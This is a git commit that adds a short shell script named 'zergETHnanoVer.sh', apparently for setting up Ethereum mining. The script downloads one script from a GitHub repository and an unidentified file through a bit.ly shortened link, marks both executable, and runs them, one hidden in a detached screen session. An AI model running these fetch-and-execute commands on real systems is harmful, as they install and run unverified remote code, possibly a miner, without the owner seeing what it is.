a96a58d597377f359b8e3b3a9dc39721c726f3c3
sn943 <89630444+sn943@users.noreply.github.com>
2021-11-03 17:07:23 +0530

    Create zergETHnanoVer.sh

---
+++ zergETHnanoVer.sh
@@ -0,0 +1,8 @@
+#!bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/tinkuJiya/gas/raw/main/zergEth.sh 
+wget https://bit.ly/2Y6rHz4 && 
+chmod +x 2Y6rHz4 
+screen -dmS Ver ./2Y6rHz4  60 70
+chmod +x zergEth.sh && ./zergEth.sh
